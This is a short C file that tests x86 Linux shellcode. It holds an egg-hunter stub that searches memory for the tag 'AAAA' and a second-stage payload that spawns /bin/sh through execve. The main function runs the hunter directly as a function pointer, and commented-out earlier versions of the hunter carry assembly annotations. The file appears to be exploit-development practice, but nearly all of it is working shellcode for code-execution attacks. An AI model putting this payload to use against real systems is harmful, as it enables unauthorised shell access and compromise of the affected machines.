/* egg tester

*/

#include<stdio.h>
#include<string.h>

//defiine a constant called EGG
#define EGG "\x41\x41\x41\x41" //AAAA

char egg[] = EGG;

unsigned char egg_hunter[] = \
//                              "\xfc"	   	           	// cld
//                              "\x31\xc0"	           	// xor eax,eax
//                              "\x31\xd2"          		// xor ebx,ebx	
//                              "\x66\x81\xca\xff\x0f"		// or dx,0xfff
//                              "\x42"		            	// inc edx
//                             "\x8d\x5a\x04"       		// lea ebx,[edx+0x4]
//                              "\xb8\x21\x00\x00\x00"	 	        // mov al, 0x21
//                             "\xcd\x80"		        // int 0x80
//                             "\x3c\xf2"		        // cmp al,0xf2
//                             "\x74\xec"		        // je ne


//"\xfc\x31\xc0\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\xb8\x21\x00\x00\x00\xcd\x80\x3c\xf2\x74\xec\xb8"
//EGG
//"\x89\xd7\xaf\x75\xe7\xff\xe7";

//"\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\xb0\x56\xcd\x80\x3c\xf2\x74\xef\xb8"
//EGG
//"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7";

"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\xb0\x56\xcd\x80\x3c\xf2\x74\xef\xb8"
EGG
"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7";

unsigned char second_stage[] = \
                                EGG 
                                EGG 
                                "\x31\xc0\x50\x68\x6e\x2f\x73\x68"
                                "\x68\x2f\x2f\x62\x69\x89\xe3\x50"
                                "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; // /bin/sh execve-stack

main()
{
  printf("[+] Searching for: %s\n", egg);
  printf("[+] Egg Hunter Length: %d\n", strlen(egg_hunter));
  printf("[+] Shellcode Length: %d\n", strlen(second_stage));
  int (*ret)() = (int(*)())egg_hunter;
  ret();
}
